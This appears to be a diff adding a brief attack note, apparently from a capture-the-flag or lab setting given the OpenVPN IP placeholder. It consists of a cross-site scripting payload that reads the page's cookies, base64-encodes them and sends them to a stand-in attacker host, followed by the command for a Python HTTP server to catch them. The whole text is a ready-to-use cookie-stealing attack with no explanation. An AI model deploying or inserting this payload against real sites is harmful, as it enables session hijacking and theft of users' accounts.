@@ -1,0 +1,5 @@
+<script>fetch('http://[Your openVPN IP]:8000/?c=' + btoa(document.cookie))</script>
+
+Listen in a python server :
+
+python3 -m http.server 8000
